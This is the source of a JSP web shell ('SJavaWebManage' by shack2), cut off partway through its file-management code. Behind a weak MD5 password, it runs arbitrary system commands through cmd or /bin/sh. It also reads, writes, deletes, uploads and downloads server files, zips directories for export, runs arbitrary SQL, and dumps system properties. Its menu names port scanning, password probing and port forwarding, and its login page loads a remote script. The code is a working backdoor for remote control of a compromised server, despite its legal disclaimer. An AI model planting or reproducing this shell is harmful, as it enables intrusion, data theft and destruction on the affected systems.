<%@page import="java.sql.ResultSetMetaData"%>
<%@page import="java.sql.ResultSet"%>
<%@page import="java.sql.DatabaseMetaData"%>
<%@page import="java.sql.DriverManager"%>
<%@page import="java.sql.Statement"%>
<%@page import="java.sql.Connection"%>
<%@page import="java.nio.charset.Charset"%>
<%@page import="java.text.DecimalFormat"%>
<%@page import="java.util.Properties"%>
<%@page import="java.util.ArrayList"%>
<%@page import="java.util.zip.ZipOutputStream"%>
<%@page import="java.util.zip.ZipEntry"%>
<%@page import="java.util.HashMap"%>
<%@page import="java.io.*"%>
<%@page import="java.util.Date"%>
<%@page import="java.text.SimpleDateFormat"%>
<%@page import="java.util.Iterator"%>
<%@page import="java.util.Map"%>
<%@page import="java.security.MessageDigest"%>
<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<%!
private static final String PASS = "098f6bcd4621d373cade4e832627b4f6";//test
private static final String VERSION = "V1.4-20160528";
private static final String[] Encodings = {"UTF-8","GB2312","GBK","ISO-8859-1","ASCII","Big5"};
private static final String REQUEST_ENCODING = "ISO-8859-1";
private static final String PAGE_ENCODING = "UTF-8";
private static final String checkNewVersion = "http://www.shack2.org/soft/javamanage/Getnewversion.jsp";//&#26816;&#26597;&#26032;&#29256;&#26412;&#26356;&#26032;

private static final String DBO = "mydbdao";//Session&#25968;&#25454;&#24211;&#36830;&#25509;&#24120;&#37327;
/*&#24037;&#20855;&#31867;*/
public static class Util{
	public static String get32Md5(String str){
		try {
			  MessageDigest md = MessageDigest.getInstance("MD5");
			  md.update(str.getBytes());
			  byte b[] = md.digest();
			  int i;
			  StringBuffer buf = new StringBuffer("");
			  for (int offset = 0; offset < b.length; offset++) {
			   i = b[offset];
			   if (i < 0)
			    i += 256;
			   if (i < 16)
			     buf.append("0");
			   buf.append(Integer.toHexString(i));
			  }
			 
			  return buf.toString().toLowerCase();
	              
	    } catch (Exception e) {
	     
	    } 
	    return "";
	 }
	public static boolean isEmpty(String val){
		if(val==null||"".equals(val)){
			return true;
		}
		return false;
	}
	public static String execCmd(String cmd,String encode){
		
		String result="";
		String[] rmd=cmd.split(" ");
		String[] cmds =new String[rmd.length+2];
		String OS = System.getProperty("os.name");
		if (OS.startsWith("Windows")) {
			cmds[0]="cmd";
			cmds[1]="/c";
		}
		else {
			cmds[0]="/bin/sh";
			cmds[1]="-c";
		}
		for(int i=0;i<rmd.length;i++){
			cmds[i+2]=rmd[i];
		}
		Process p=null;
		try{
		p = Runtime.getRuntime().exec(cmds);
		OutputStream os = p.getOutputStream();
		BufferedInputStream in = new BufferedInputStream(p.getInputStream());
		BufferedReader br = new BufferedReader(new InputStreamReader(in,encode));
		DataInputStream dis = new DataInputStream(in);
		String disr = br.readLine();
		while ( disr != null ) {
		 	result+=disr+"<br/>";
		    disr = br.readLine();
		}
		if (p.waitFor() != 0){
			
			in = new BufferedInputStream(p.getErrorStream());
			br = new BufferedReader(new InputStreamReader(in));
			dis = new DataInputStream(in);
			disr = br.readLine();
			while ( disr != null ) {
			 	result+=disr+"<br/>";
			    disr = br.readLine();
			}
		}
		}catch(Exception e){
			result=e.getMessage();
		}finally{
			if(p!=null){
				p.destroy();
			}
			
		}
		return result.replaceAll("\\r\\n", "<br/>");
	}
	
	public static String formatPath(String path){
		if(isEmpty(path)){
			return "";
		}
		return path.replaceAll("\\\\","/").replace('\\', '/').replaceAll("//", "/");
	}
	
	public static String formatDate(long time) {
		SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
		return format.format(new Date(time));
	}
	//&#33719;&#21462;&#21442;&#25968;&#20540;
	public static String getRequestStringVal(HttpServletRequest request,String key){
		String val=request.getParameter(key);
		if(!isEmpty(val)){
			return val;
		}
		return "";
	}
	public static int getRequestIntVal(HttpServletRequest request,String key){
		String val=getRequestStringVal(request,key);
		int v=0;
		try{
			v=Integer.parseInt(val);
		}catch(Exception e){

		}
		return v;
	}
	//
	
	public static void print(JspWriter out,int level,String info) throws Exception{
		try{
		
		if(level==1){
			out.print("<font color=\"green\">"+info+"</font>");
		}
		else if(level==2){
			out.print("<font color=\"orange\">"+info+"</font>");
		}
		else if(level==3){
			out.print("<font color=\"red\">"+info+"</font>");
		}
		else{
			out.print("<font>"+info+"</font>");
		}
		}catch(Exception e){
			throw e;
		}
	}
}
/*
&#25968;&#25454;&#24211;&#25805;&#20316;&#24037;&#20855;&#31867;
*/
private static class DBUtil{
private Connection conn = null;
private Statement stmt = null;
private String driver;
private String url;
private String uid;
private String pwd;
public DBUtil(String driver,String url,String uid,String pwd) throws Exception {
this(driver,url,uid,pwd,false);
}
public DBUtil(String driver,String url,String uid,String pwd,boolean connect) throws Exception {
try{
Class.forName(driver);
if (connect)
this.conn = DriverManager.getConnection(url,uid,pwd);
this.url = url;
this.driver = driver;
this.uid = uid;
this.pwd = pwd;
}catch(ClassNotFoundException e){
	e.printStackTrace();
	throw e;
}
}
public void connect() throws Exception{
this.conn = DriverManager.getConnection(url,uid,pwd);
}
public Object execute(String sql) throws Exception {
if (isValid()) {
stmt = conn.createStatement();
if (stmt.execute(sql)) {
return stmt.getResultSet();
} else {
return ""+stmt.getUpdateCount();
}
}
throw new Exception("Connection is inValid.");
}
public void closeStmt() throws Exception{
if (this.stmt != null)
stmt.close();
}
public boolean isValid() throws Exception {
return conn != null && !conn.isClosed();
}
public void close() throws Exception {
if (isValid()) {
closeStmt();
conn.close();
}
}
public boolean notchange(String driver,String url,String uid,String pwd) {
return (this.driver.equals(driver) && this.url.equals(url) && this.uid.equals(uid) && this.pwd.equals(pwd));
}
public Connection getConn(){
return this.conn;
}
}

/**
 *&#23558;&#25991;&#20214;&#25110;&#26159;&#25991;&#20214;&#22841;&#25171;&#21253;&#21387;&#32553;&#25104;zip&#26684;&#24335;
 * 
 */
public static class ZipUtils {    
   /**
     * &#21019;&#24314;ZIP&#25991;&#20214;
     * @param sourcePath &#25991;&#20214;&#25110;&#25991;&#20214;&#22841;&#36335;&#24452;(&#22810;&#20010;&#35831;&#29992;&#36887;&#21495;&#38548;&#24320;)
     * @param zipPath &#29983;&#25104;&#30340;zip&#25991;&#20214;&#23384;&#22312;&#36335;&#24452;&#65288;&#21253;&#25324;&#25991;&#20214;&#21517;&#65289;
     */
    public static void createZip(String sourcePath, String zipPath) {
        FileOutputStream fos = null;
        ZipOutputStream zos = null;
        try {
            fos = new FileOutputStream(zipPath);
            zos = new ZipOutputStream(fos);
            String[] fs=sourcePath.split(",");
            for(int i=0;i<fs.length;i++){
            	writeZip(new File(fs[i]), "", zos);	
            }
        } catch (Exception e) {
            
        } finally {
            try {
                if (zos != null) {
                    zos.close();
                }
            } catch (IOException e) {
                
            }

        }
    }
    
    private static void writeZip(File file, String parentPath, ZipOutputStream zos) {
        if(file.exists()){
            if(file.isDirectory()){//&#22788;&#29702;&#25991;&#20214;&#22841;
                parentPath+=file.getName()+File.separator;
                File [] files=file.listFiles();
                for(int i=0;i<files.length;i++){
                	File f=files[i];
                    writeZip(f, parentPath, zos);
                }
            }else{
                FileInputStream fis=null;
                try {
                    fis=new FileInputStream(file);
                    ZipEntry ze = new ZipEntry(parentPath + file.getName());
                    zos.putNextEntry(ze);
                    byte [] content=new byte[1024];
                    int len;
                    while((len=fis.read(content))!=-1){
                        zos.write(content,0,len);
                        zos.flush();
                    }
                  
                } catch (Exception e) {
                    
                }finally{
                    try {
                        if(fis!=null){
                            fis.close();
                        }
                    }catch(IOException e){
                    }
                }
            }
        }
    }
}

public static class FileUtil{
	
	public static String getFileSize(long size){
    	DecimalFormat df = new DecimalFormat("#.00");
    	if(size<1024){
    		return size+"Byte";
    	}
    	else if(size<(1024*1024)){
    		
    		return df.format((double)(size/1024))+"KB";
    	}
    	else if (size<(1024*1024*1240)){
    		return df.format((double)(size/1024/1024))+"M";
    	}
    	else{
    		return df.format((double)(size/1024/1024/1024))+"G";
    	}	
    }
	//&#36882;&#24402;&#21024;&#38500;&#25991;&#20214;
	public static boolean deleteFile(String path){

		File f=new File(path);
		if(f.isDirectory()){
			File[] fs=f.listFiles();
			for(int i=0;i<fs.length;i++){
				if(fs[i].isDirectory()){
					deleteFile(fs[i].getPath());
				}
				fs[i].delete();
			}
		}
		return f.delete();
	}
	
public static String  writeTextToFile(String text,String path,String encode){
	String msg="";
		try {

			
			OutputStreamWriter osw = null;
			if(Util.isEmpty(encode)){
				osw=new OutputStreamWriter(new FileOutputStream(path));
			}
			else{
				osw=new OutputStreamWriter(new FileOutputStream(path),encode);
			}
			BufferedWriter bw=new BufferedWriter(osw);
			bw.write(text);

			bw.flush();
			bw.close();
			osw.close();
			msg="&#20445;&#23384;&#25104;&#21151;&#65281;";
		} catch (Exception e) {
	
			msg="&#20445;&#23384;&#24322;&#24120;----"+e.getMessage();
		} 
		return msg;
		
		
	}	
	public static String readFileToString(String path,String encoding){
		OutputStream os=null;
		FileInputStream fis=null;
		InputStreamReader isr=null;
		String result="";
		try {
			String fname=path.substring(path.lastIndexOf("/")+1);
			File f=new File(path);
		    fis=new FileInputStream(path);
		    if(Util.isEmpty(encoding)){
				isr=new InputStreamReader(fis);
			}
			else{
				isr=new InputStreamReader(fis,encoding);
			}
			BufferedReader br=new BufferedReader(isr);
		
			String tem=null;
		    while((tem=br.readLine())!=null){
		    	
		    	result+=(tem+"\r\n");
		    }
		    br.close();
		    isr.close();
		    fis.close();
		}catch(Exception e){
			result="&#25991;&#20214;&#35835;&#21462;&#38169;&#35823;&#65281;"+e.getMessage();
		}
		return result.replaceAll("<", "&lt;").replaceAll(">", "&gt;");
	} 
	
	public static void newFile(String path,String isDir) throws Exception{
		
		File f=new File(path);
		if(!f.exists()){
		if("1".equals(isDir)){
			f.mkdir();
		}
		else{
			f.createNewFile();
		}
		}
	}
	
	public static void downLoadFile(HttpServletResponse response,String path){
		OutputStream os=null;
		FileInputStream fis=null;
		BufferedInputStream bis=null;
		try {
			String fname=path.substring(path.lastIndexOf("/")+1);
			File f=new File(path);
			os= response.getOutputStream();    
		    
		    response.reset();
		    response.setHeader("Content-Disposition", "attachment; filename="+fname);
		    response.setContentType("application/octet-stream; charset=UTF-8");
		    fis=new FileInputStream(path);
		    bis=new BufferedInputStream(fis);
		    byte[] tem=new byte[4068];
		    int len=0;
		    while((len=bis.read(tem))!=-1){
		        	os.write(tem,0,len);
		    }
		    
		}catch(Exception e){}
		finally {
			try{
			if(bis!=null) bis.close();
			if(fis!=null)fis.close();
		    
		     if (os != null) {
		    	os.flush();
		        os.close();
		    }
			}catch(Exception e){}
		}
	}
	
}

/*&#19978;&#20256;&#31867;*/
public static class UploadFile {

    /**
     * &#19978;&#20256;&#25991;&#20214;&#32452;&#20214;&#65292;&#35843;&#29992;&#35813;&#26041;&#27861;&#30340;servlet&#22312;&#20351;&#29992;&#35813;&#26041;&#27861;&#21069;&#24517;&#39035;&#20808;&#35843;&#29992;request.setCharacterEncoding()&#26041;&#27861;&#65292;&#35774;&#32622;&#32534;&#30721;&#26684;&#24335;&#12290;&#35813;&#32534;&#30721;&#26684;&#24335;&#39035;&#19982;&#39029;&#38754;&#32534;&#30721;&#26684;&#24335;&#19968;&#33268;&#12290;
     * @param sis &#25968;&#25454;&#27969;
     * @param encoding &#32534;&#30721;&#26041;&#24335;&#12290;&#24517;&#39035;&#19982;jsp&#39029;&#38754;&#32534;&#30721;&#26041;&#24335;&#19968;&#26679;&#65292;&#21542;&#21017;&#20250;&#26377;&#20081;&#30721;&#12290;
     * @param length &#25968;&#25454;&#27969;&#38271;&#24230;
     * @param upLoadPath &#25991;&#20214;&#20445;&#23384;&#36335;&#24452;
     * @throws FileNotFoundException
     * @throws IOException
     */
    public static HashMap uploadFile(ServletInputStream sis, String encoding, int length, String upLoadPath) throws IOException {
        HashMap paramMap = new HashMap();

        boolean isFirst = true;
        String boundary = null;//&#20998;&#30028;&#31526;
        byte[] tmpBytes = new byte[4096];//tmpBytes&#29992;&#20110;&#23384;&#20648;&#27599;&#34892;&#35835;&#21462;&#21040;&#30340;&#23383;&#33410;&#12290;
        int[] readBytesLength = new int[1];//&#25968;&#32452;readBytesLength&#20013;&#30340;&#20803;&#32032;i[0]&#65292;&#29992;&#20110;&#20445;&#23384;readLine()&#26041;&#27861;&#20013;&#35835;&#21462;&#30340;&#23454;&#38469;&#23383;&#33410;&#25968;&#12290;
        int readStreamlength = 0;//readStreamlength&#29992;&#20110;&#35760;&#24405;&#24050;&#32463;&#35835;&#21462;&#30340;&#27969;&#30340;&#38271;&#24230;&#12290;
        String tmpString = null;

        tmpString = readLine(tmpBytes, readBytesLength, sis, encoding);
        readStreamlength = readStreamlength + readBytesLength[0];
        while (readStreamlength < length) {
            if (isFirst) {
                boundary = tmpString;
                isFirst = false;
            }
            if (tmpString.equals(boundary)) {
                String contentDisposition = readLine(tmpBytes, readBytesLength, sis, encoding);
                readStreamlength = readStreamlength + readBytesLength[0];
                String contentType = readLine(tmpBytes, readBytesLength, sis, encoding);
                readStreamlength = readStreamlength + readBytesLength[0];
                //&#24403;&#26102;&#19978;&#20256;&#25991;&#20214;&#26102;content-Type&#19981;&#20250;&#26159;null
                if (contentType != null && contentType.trim().length() != 0) {
                    String paramName = getPramName(contentDisposition);
                    String fileName = getFileName(getFilePath(contentDisposition));

                    paramMap.put(paramName, fileName);

                    //&#36339;&#36807;&#31354;&#26684;&#34892;
                    readLine(tmpBytes, readBytesLength, sis, encoding);
                    readStreamlength = readStreamlength + readBytesLength[0];

                    /*
                     * &#25991;&#20214;&#21517;&#19981;&#20026;&#31354;&#65292;&#21017;&#19978;&#20256;&#20102;&#25991;&#20214;&#12290;
                     */
                    if (fileName != null && fileName.trim().length() != 0) {
                        fileName = upLoadPath + fileName;

                        //&#24320;&#22987;&#35835;&#21462;&#25968;&#25454;
                        byte[] cash = new byte[4096];
                        int flag = 0;
                        FileOutputStream fos = new FileOutputStream(fileName);
                        tmpString = readLine(tmpBytes, readBytesLength, sis, encoding);
                        readStreamlength = readStreamlength + readBytesLength[0];
                        /*
                         *&#20998;&#30028;&#31526;&#36319;&#32467;&#26463;&#31526;&#34429;&#28982;&#30475;&#19978;&#21435;&#21482;&#26159;&#32467;&#26463;&#31526;&#27604;&#20998;&#30028;&#31526;&#22810;&#20102;?--?&#65292;&#20854;&#23454;&#19981;&#26159;&#65292;
                         *&#20998;&#30028;&#31526;&#26159;?-----------------------------45931489520280?&#21518;&#38754;&#26377;2&#20010;&#30475;&#19981;&#35265;&#30340;&#22238;&#36710;&#25442;&#34892;&#31526;&#65292;&#21363;0D 0A
                         *&#32780;&#32467;&#26463;&#31526;&#26159;?-----------------------------45931489520280--?&#21518;&#38754;&#20877;&#36319;2&#20010;&#30475;&#19981;&#35265;&#30340;&#22238;&#36710;&#25442;&#34892;&#31526;&#65292;&#21363;0D 0A
                         *
                         */
                        while (tmpString.indexOf(boundary.substring(0, boundary.length() - 2)) == -1) {
                            for (int j = 0; j < readBytesLength[0]; j++) {
                                cash[j] = tmpBytes[j];
                            }
                            flag = readBytesLength[0];
                            tmpString = readLine(tmpBytes, readBytesLength, sis, encoding);
                            readStreamlength = readStreamlength + readBytesLength[0];
                            if (tmpString.indexOf(boundary.substring(0, boundary.length() - 2)) == -1) {
                                fos.write(cash, 0, flag);
                                fos.flush();
                            } else {
                                fos.write(cash, 0, flag - 2);
                                fos.flush();
                            }
                        }
                        fos.close();
                    } else {
                        //&#36339;&#36807;&#31354;&#26684;&#34892;
                        readLine(tmpBytes, readBytesLength, sis, encoding);
                        readStreamlength = readStreamlength + readBytesLength[0];

                        //&#35835;&#21462;&#20998;&#30028;&#31526;&#25110;&#32773;&#32467;&#26463;&#31526;
                        tmpString = readLine(tmpBytes, readBytesLength, sis, encoding);
                        readStreamlength = readStreamlength + readBytesLength[0];
                    }
                } //&#24403;&#19981;&#26159;&#38271;&#20256;&#25991;&#20214;&#26102;
                else {
                    String paramName = getPramName(contentDisposition);
                    String value = readLine(tmpBytes, readBytesLength, sis, encoding);
                    //&#21435;&#25481;&#22238;&#36710;&#25442;&#34892;&#31526;(&#26368;&#21518;&#20004;&#20010;&#23383;&#33410;)
                    byte[] valueByte=value.getBytes(encoding);
                    value =new String(valueByte, 0, valueByte.length-2, encoding);
                    
                    readStreamlength = readStreamlength + readBytesLength[0];
                    paramMap.put(paramName, value);
                    tmpString = readLine(tmpBytes, readBytesLength, sis, encoding);
                    readStreamlength = readStreamlength + readBytesLength[0];
                }
            }

        }
        sis.close();
        return paramMap;
    }

    /**
     * &#20174;&#27969;&#20013;&#35835;&#21462;&#19968;&#34892;&#25968;&#25454;&#12290;
     * @param bytes &#23383;&#33410;&#25968;&#32452;&#65292;&#29992;&#20110;&#20445;&#23384;&#20174;&#27969;&#20013;&#35835;&#21462;&#21040;&#30340;&#23383;&#33410;&#12290;
     * @param index &#19968;&#20010;&#25972;&#22411;&#25968;&#32452;&#65292;&#21482;&#26377;&#19968;&#20010;&#20803;&#32032;&#65292;&#21363;index[0],&#29992;&#20110;&#20445;&#23384;&#20174;&#27969;&#20013;&#23454;&#38469;&#35835;&#21462;&#30340;&#23383;&#33410;&#25968;&#12290;
     * @param sis &#25968;&#25454;&#27969;
     * @param encoding &#32452;&#24314;&#23383;&#31526;&#20018;&#26102;&#25152;&#29992;&#30340;&#32534;&#30721;
     * @return &#23558;&#35835;&#21462;&#21040;&#30340;&#23383;&#33410;&#32463;&#29305;&#23450;&#32534;&#30721;&#26041;&#24335;&#32452;&#25104;&#30340;&#23383;&#31526;&#20018;&#12290;
     */
    private static String readLine(byte[] bytes, int[] index, ServletInputStream sis, String encoding) {
        try {
            index[0] = sis.readLine(bytes, 0, bytes.length);//readLine()&#26041;&#27861;&#25226;&#35835;&#21462;&#30340;&#20869;&#23481;&#20445;&#23384;&#21040;bytes&#25968;&#32452;&#30340;&#31532;0&#21040;&#31532;bytes.length&#22788;&#65292;&#36820;&#22238;&#20540;&#26159;&#23454;&#38469;&#35835;&#21462;&#30340; &#23383;&#33410;&#25968;&#12290;
            if (index[0] < 0) {
                return null;
            }
        } catch (IOException e) {
            return null;
        }
        if (encoding == null) {
            return new String(bytes, 0, index[0]);
        } else {
            try {
                return new String(bytes, 0, index[0], encoding);
            } catch (Exception ex) {
                return null;
            }
        }

    }

    private static String getPramName(String contentDisposition) {
        String s = contentDisposition.substring(contentDisposition.indexOf("name=\"") + 6);
        s = s.substring(0, s.indexOf('\"'));
        return s;
    }

    private static String getFilePath(String contentDisposition) {
        String s = contentDisposition.substring(contentDisposition.indexOf("filename=\"") + 10);
        s = s.substring(0, s.indexOf('\"'));
        return s;
    }

    private static String getFileName(String filePath) {
        String rtn = null;
        if (filePath != null) {
            int index = filePath.lastIndexOf("/");//&#26681;&#25454;name&#20013;&#21253;&#19981;&#21253;&#21547;/&#26469;&#21028;&#26029;&#27983;&#35272;&#22120;&#30340;&#31867;&#22411;&#12290;
            if (index != -1)//&#21253;&#21547;/&#65292;&#21017;&#27492;&#26102;&#21487;&#20197;&#21028;&#26029;&#25991;&#20214;&#30001;&#28779;&#29392;&#27983;&#35272;&#22120;&#19978;&#20256;
            {
                rtn = filePath.substring(index + 1);//&#33719;&#24471;&#25991;&#20214;&#21517;
            } else//&#19981;&#21253;&#21547;/,&#21487;&#20197;&#21028;&#26029;&#25991;&#20214;&#30001;ie&#27983;&#35272;&#22120;&#19978;&#20256;&#12290;
            {
                index = filePath.lastIndexOf("\\");
                if (index != -1) {
                    rtn = filePath.substring(index + 1);//&#33719;&#24471;&#25991;&#20214;&#21517;
                } else {
                    rtn = filePath;
                }
            }
        }
        return rtn;
    }
}
%>
<%
request.setCharacterEncoding(PAGE_ENCODING);
//shell&#25152;&#22312;&#30913;&#30424;&#36335;&#24452;
final String shellPath=request.getContextPath()+request.getServletPath();

//shell&#30913;&#30424;&#26356;&#30446;&#24405;
String webRootPath=request.getSession().getServletContext().getRealPath("/");

if (Util.isEmpty(webRootPath)) {//for weblogic
	webRootPath = Util.formatPath(this.getClass().getClassLoader().getResource("/").getPath());
	webRootPath = webRootPath.substring(0,webRootPath.indexOf("/WEB-INF"));
	webRootPath=webRootPath.substring(0,webRootPath.lastIndexOf("/"));
} else {
	webRootPath = application.getRealPath("/");
}
webRootPath=Util.formatPath(webRootPath);
final String shellDir=webRootPath+request.getContextPath();

String m=Util.getRequestStringVal(request, "m");
if(Util.isEmpty(m)){
	m="FileManage";
}
//&#30331;&#24405;&#23494;&#30721;&#39564;&#35777;

if("Login".equals(m)){
	String dow=Util.getRequestStringVal(request, "do");
	if(Util.isEmpty(dow)){
		%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<meta name="author" content="shack2" />
<title>Powered By SJavaWebManage</title>

<style type="text/css">
body {
	font-size: 12px;
	color: #464646;
	margin: 0px;
	padding: 10px;
	background-color: #fbfbfb;
	border-collapse: collapse;
}

div {
	line-height: 30px;
}

input {
	vertical-align: middle;
}
</style>

</head>

<body>
	<div>
		<form action="<%=shellPath %>?m=Login&do=DoLogin" method="post"
			enctype="application/x-www-form-urlencoded" name="loginForm">
			&#35831;&#36755;&#20837;&#23494;&#30721;&#65306;<input type="password" name="pass" /><input name=""
				type="submit" value="&#30331;&#24405;" />
		</form>
		<%
String info=Util.getRequestStringVal(request, "info");
if("false".equals(info)){
	Util.print(out,2,"&#23494;&#30721;&#38169;&#35823;&#65292;&#22030;&#22030;&#65281;");
}
%>
	</div>
	<div style="border-bottom: 2px #ccc solid;">
		<div>Copyright (c) 2014 <a href="http://www.shack2.org">http://www.shack2.org</a>
		All Rights Reserved| coded by shack2 QQ&#65306;1341413415| Powered By
		SJavaWebManage| version:<%=VERSION%>&nbsp;&nbsp;&#26032;&#29256;&#26412;:<script src="<%=checkNewVersion%>"></script>
		</div>
		<div><font><b>&#35831;&#21247;&#20351;&#29992;&#26412;&#24037;&#20855;&#38750;&#27861;&#20837;&#20405;&#31649;&#29702;&#20219;&#20309;&#31995;&#32479;&#65292;&#35831;&#21512;&#27861;&#20351;&#29992;&#65292;&#20854;&#36896;&#25104;&#30340;&#19968;&#20999;&#21518;&#26524;&#19982;&#20316;&#32773;&#26080;&#20851;&#12290;</b></font></div>
		</div>
</body>
</html>
<%
	}
	if("DoLogin".equals(dow)){
		String pass=Util.getRequestStringVal(request, "pass");
		
		if(PASS.equals(Util.get32Md5(pass).toLowerCase())){
			session.setAttribute("isLogin", "true");
			response.sendRedirect(shellPath+"?m=FileManage");
		}
		else{
			response.sendRedirect(shellPath+"?m=Login&info=false");
		}
	}
	//&#38459;&#27490;&#19979;&#38754;&#30340;&#20869;&#23481;&#36755;&#20986;
	return;
}
else{
	
	//&#30331;&#24405;&#29366;&#24577;&#39564;&#35777;
	String isLogin=session.getAttribute("isLogin")+"";
	if(!"true".equals(isLogin)){
		response.sendRedirect(shellPath+"?m=Login");
	}
}
%>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<style type="text/css">
body {
	font-size: 12px;
	color: #464646;
	margin: 0px;
	padding: 0px;
}

#menue {
	height: 35px;
	background: #efefef;
	overflow: hidden;
	margin: 0px auto;
	width: 1200px;
	padding: 0px 10px 0px 10px;
	border-bottom: 1px solid #222;
	text-align: center;
}

#menue a {
	text-decoration: none;
	color: #fff;
	padding: 10px 22px 10px 22px;
	letter-spacing: 2px;
	height: 35px;
	line-height: 35px;
	font-weight: bold;
}

ul, li, font, dd, dl {
	padding: 0px;
	margin: 0px
}

#content {
	line-height: 30px;
	padding: 10px;
	overflow: hidden;
	margin: 0px auto;
	width: 1200px;
	color: #464646;
	background: #fff;
}

#content div {
	line-height: 30px;
}
/*EnvsInfo*/
#EnvsInfo {
	padding: 10px;
}

#EnvsInfo li {
	line-height: 25px;
}
/*FileManage css*/
#filesList dd, font {
	float: left;
	text-align: left;
}

.fileName {
	width: 600px;
	display: block;
	white-space: nowrap;
	overflow: hidden;
	text-overflow: ellipsis;
}

.fileUpdateTime, .filePermis {
	width: 140px;
}

.fileSize {
	width: 120px;
}

.fileDo a {
	margin-left: 10px;
	color: #464646;
}

#filesList div {
	height: 30px;
	padding: 0px 5px 0px 5px;;
	line-height: 30px;
	border-bottom: 1px solid #ccc;
	background: #fcfcfc;
}

#filesList a {
	height: 30px;
	line-height: 30px;
}

#filesList input {
	margin: 0px;
	padding: 0px;
	margin-right: 5px;
	vertical-align: text-top;
}

#diskInfo {
	clear: both;
	height: 30px;
	line-height: 30px;
}

#diskInfo a {
	height: 30px;
	line-height: 30px;
	color: #555;
	margin-right: 5px;
}

#filesInfo {
	padding: 5px;
}

#filesInfo a {
	margin-right: 10px;
	color: #464646;
}

#CMDS input {
	margin: 0px;
	vertical-align: middle;
}

#CMDS select {
	margin: 0px;
	vertical-align: middle;
}
/*CMD*/
#execResult {
	line-height: 30px;
}
/*DBManage*/
#dbinfo {
	line-height: 25px;
}

#dbdata table {
	border-collapse: collapse;
}

#dbdata td {
	border-bottom: 1px solid #ccc;
}
/*bottom*/
.bottom {
	clear: both;
	color: #fff;
	width: 1200px;
	margin: 0px auto;
	padding: 10px;
	height: 25px;
	line-height: 25px;
	background: #888;
	text-align: center;
}

.bottom a {
	color: #fff;
	height: 25px;
	line-height: 25px;
	li
}

#fileListTop div {
	float: left;
}
</style>
<script type="text/javascript">
function post(url,data){
	var op=document.getElementById("postForm");
	if(op!=null){
		document.body.removeChild(op);
	}
	var pForm = document.createElement("form");
	pForm.id="postForm";
	document.body.appendChild(pForm);  
	pForm.method = "post";  
	pForm.action = url;
	for(var x in data){
		var input = document.createElement("input");  
		input.setAttribute("name",x);
		input.setAttribute("type","hidden");
		input.setAttribute("value",data[x]);
		pForm.appendChild(input);
	}
	pForm.submit();
}
</script>
</head>
<body>
	<div>
		<!--top-->
		<div
			style="background-color: #efefef; height: 25px; line-height: 25px; padding: 5px 0px 0px 5px; border-bottom: 2px #000 solid; text-align: center">
			Web:localhost:8000 &#20027;&#26426;IP&#65306;192.168.11.11 |Java WebManage coded by shack2
			| http://www.shack2.org | version:<%=VERSION%>
			ps:&#26412;&#33050;&#26412;&#36866;&#29992;&#20110;&#31616;&#21333;&#30340;Web&#31649;&#29702;&#65292;&#20026;&#20102;&#20860;&#23481;&#36739;&#20302;&#29256;&#26412;JDK&#65292;&#37319;&#29992;JDK1.3&#24320;&#21457;
		</div>
		<!--menue-->
		<div id="menue">
			<a href="javascript:post('<%=shellPath%>',{m:'EnvsInfo'})"
				name="EnvsInfo">&#29615;&#22659;&#20449;&#24687;</a><a
				href="javascript:post('<%=shellPath%>',{m:'FileManage'})"
				name="FileManage">&#25991;&#20214;&#31649;&#29702;</a><a
				href="javascript:post('<%=shellPath%>',{m:'CMDS'})" name="CMDS">&#21629;&#20196;&#25191;&#34892;</a><a
				href="javascript:post('<%=shellPath%>',{m:'DBManage'})">&#25968;&#25454;&#24211;&#31649;&#29702;</a><a
				href="javascript:void(0)">&#31471;&#21475;&#25506;&#27979;</a><a href="javascript:void(0)">&#21475;&#20196;&#25506;&#27979;</a><a
				href="javascript:void(0)">&#36716;&#21475;&#36716;&#21457;</a><a href="javascript:void(0)">&#36828;&#31243;&#25991;&#20214;&#19979;&#36733;</a><a
				href="javascript:void(0)">&#23631;&#24149;&#25130;&#22270;</a><a href="http://www.shack2.org">bug&#21453;&#39304;</a><a
				href="javascript:void(0)">&#36864;&#20986;</a>
		</div>
		<!--content-->
		<div id="content">
			<%
		if("EnvsInfo".equals(m)){
		%>
			<!--&#29615;&#22659;&#20449;&#24687;-->
			<div id="EnvsInfo">
				<ul>
					<%
				Properties ps=System.getProperties();
				Iterator iter=ps.keySet().iterator();
				while (iter.hasNext()) {
					String key=iter.next()+"";
					out.print("<li>"+key+"&nbsp;&nbsp;"+ps.getProperty(key)+"</li>");
				}
				%>

				</ul>
			</div>
			<%
		}
		%>

			<%	
		//&#25991;&#20214;&#31649;&#29702;
		if("FileManage".equals(m)){
			String dow=Util.getRequestStringVal(request, "do");
			String path=Util.getRequestStringVal(request, "path");
			if("upload".equals(dow)){
				if(!Util.isEmpty(path)){
					UploadFile.uploadFile(request.getInputStream(), PAGE_ENCODING,Integer.parseInt(request.getHeader("Content-Length")),path);
					out.print("<script type=\"text/javascript\">post('"+shellPath+"',{'m':'FileManage','dir':'"+path+"'});</script>");
					//response.sendRedirect(shellPath+"?m=FileManage&dir="+path);
				}
			}
			if("newFile".equals(dow)){
				if(!Util.isEmpty(path)){
					String isDir=Util.getRequestStringVal(request, "isDir");
					String fname=Util.getRequestStringVal(request, "fileName");
					FileUtil.newFile(path+"/"+fname,isDir);
					out.print("<script type=\"text/javascript\">post('"+shellPath+"',{'m':'FileManage','dir':'"+path+"'});</script>");
					//response.sendRedirect(shellPath+"?m=FileManage&dir="+path);
				}
			}
			else if("packFiles".equals(dow)){
				if(!Util.isEmpty(path)){
					String files=Util.getRequestStringVal(request, "files");
					String zipName=Util.getRequestStringVal(request, "zipName");
					String toPath="";
					if(Util.isEmpty(files)){
						File f=new File(path);
						ZipUtils.createZip(path, Util.formatPath(f.getParent())+"/"+zipName+".zip");
					}
					else{
							//&#25171;&#21253;&#22810;&#20010;&#25991;&#20214;
						toPath=path;
						ZipUtils.createZip(files, path+"/"+zipName+".zip");
					}
					
					out.print("<script type=\"text/javascript\">post('"+shellPath+"',{'m':'FileManage','dir':'"+toPath+"'});</script>");
					//response.sendRedirect(shellPath+"?m=FileManage&dir="+path);
				}
			}
			else if("editFile".equals(dow)){
